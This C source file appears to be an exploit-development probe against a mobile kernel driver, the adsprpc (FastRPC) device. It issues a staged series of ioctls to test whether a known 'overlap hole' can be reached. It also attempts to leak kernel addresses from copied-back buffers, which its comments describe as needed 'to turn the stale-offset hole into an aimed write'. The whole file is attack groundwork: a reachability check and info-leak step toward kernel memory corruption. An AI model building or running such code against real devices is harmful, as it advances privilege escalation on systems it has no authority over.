#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

/* Step-by-step reachability measurement for the adsprpc overlap hole, in the order the
 * driver itself uses (adsprpc.c:1314-1323 does exactly: handle=1,
 * sc=REMOTE_SCALARS_MAKE(0,1,0), pra[0] = {&tgid, 4}).  Nothing here uses overlapping
 * pra entries, so get_args() cannot aim a write outside its own context buffer: this run
 * only answers "which stage refuses us".
 *
 *   open(O_RDONLY)        -> DAC/MAC for read
 *   SETMODE(parallel)     -> already proven dispatched (returns 0 using arg as a VALUE)
 *   INIT(flags=0)         -> needs the ADSP channel up; registers handle 1
 *   INVOKE(handle=1,0,1,0)-> marshals 4 bytes through get_args() and asks the DSP
 *   INVOKE with an OUT buf-> put_args() copies the meta region back to us, which leaks
 *                          where `args` sits inside ctx->buf->virt -- the number we need
 *                          to turn the stale-offset hole into an aimed write.
 */
typedef struct { void *pv; ssize_t len; } remote_buf_t;
typedef union { remote_buf_t buf; uint32_t h; } remote_arg_t;

#define MAKE_SC(method, in, out) \
    (((uint32_t)(method) << 24) | (((uint32_t)(in) & 0xff) << 16) | \
     (((uint32_t)(out) & 0xff) << 8))
#define IOCW(n, sz) (unsigned long)((3u << 30) | ((sz) << 16) | ((unsigned long)'R' << 8) | (n))

struct ioctl_invoke { uint32_t handle; uint32_t sc; remote_arg_t *pra; };
struct ioctl_init {
    uint32_t flags; uint32_t pad;
    uintptr_t file; int32_t filelen; int32_t filefd;
    uintptr_t mem;  int32_t memlen;  int32_t memfd;
};

static void dump(const char *tag, void *p, size_t n)
{
    unsigned char *b = p;
    size_t i;
    printf("  %s:\n", tag);
    for (i = 0; i < n; i += 8) {
        uint64_t v;
        memcpy(&v, b + i, 8);
        printf("    +%04zx %016llx", i, (unsigned long long)v);
        if (v >= 0xffffff8000000000ULL)
            printf("   <== kernel VA-shaped");
        printf("\n");
    }
}

int main(void)
{
    struct ioctl_init in;
    struct ioctl_invoke iv;
    remote_arg_t pra[4];
    uint32_t sc;
    static unsigned char inbuf[256], outbuf[256];
    int fd, tgid = getpid();
    int i, rc = 1;

    setvbuf(stdout, NULL, _IONBF, 0);
    memset(inbuf, 'A', sizeof inbuf);
    memset(outbuf, 0, sizeof outbuf);

    fd = open("/dev/adsprpc-smd", O_RDONLY);
    printf("open O_RDONLY -> %d errno=%d (%s)\n", fd, fd < 0 ? errno : 0,
           fd < 0 ? strerror(errno) : "ok");
    if (fd < 0)
        return 2;

    errno = 0;
    printf("SETMODE(parallel) rc=%d errno=%d\n",
           ioctl(fd, IOCW(5, 4), (unsigned long)0), errno);

    memset(&in, 0, sizeof in);
    in.flags = 0;                       /* FASTRPC_INIT (legacy), not CREATE */
    errno = 0;
    rc = ioctl(fd, IOCW(6, sizeof in), &in);
    printf("INIT(flags=0) rc=%d errno=%d (%s)   [needs ADSP channel + registers handle]\n",
           rc, errno, strerror(errno));

    /* the exact call the driver makes internally: handle 1, method 0, one 4-byte in buf */
    memset(pra, 0, sizeof pra);
    pra[0].buf.pv = &tgid;
    pra[0].buf.len = sizeof tgid;
    sc = MAKE_SC(0, 1, 0);
    memset(&iv, 0, sizeof iv);
    iv.handle = 1;
    iv.sc = sc;
    iv.pra = pra;
    errno = 0;
    rc = ioctl(fd, IOCW(1, sizeof iv), &iv);
    printf("INVOKE(h=1,method=0,in=1) rc=%d errno=%d (%s)\n", rc, errno, strerror(errno));

    /* same, but with one OUT buffer: put_args() copies back the marshalled area, which is
     * our chance to see kernel-side addresses inside ctx->buf (needed to aim the write) */
    memset(pra, 0, sizeof pra);
    pra[0].buf.pv = inbuf;
    pra[0].buf.len = 4;
    pra[1].buf.pv = outbuf;
    pra[1].buf.len = (ssize_t)sizeof outbuf;
    iv.sc = MAKE_SC(0, 1, 1);
    iv.pra = pra;
    errno = 0;
    rc = ioctl(fd, IOCW(1, sizeof iv), &iv);
    printf("INVOKE(h=1,method=0,in=1,out=1) rc=%d errno=%d (%s)\n", rc, errno, strerror(errno));
    dump("outbuf after put_args", outbuf, 128);

    /* and handle 0, in case the legacy service is numbered differently */
    for (i = 0; i < 4; i++) {
        memset(pra, 0, sizeof pra);
        pra[0].buf.pv = &tgid;
        pra[0].buf.len = sizeof tgid;
        iv.handle = (uint32_t)i;
        iv.sc = MAKE_SC(0, 1, 0);
        iv.pra = pra;
        errno = 0;
        rc = ioctl(fd, IOCW(1, sizeof iv), &iv);
        printf("INVOKE(h=%d) rc=%d errno=%d (%s)%s\n", i, rc, errno, strerror(errno),
               rc > 0 ? "   [positive rc = the ioctl returned the DSP result itself, not an error]" : "");
    }
    close(fd);
    return 0;
}
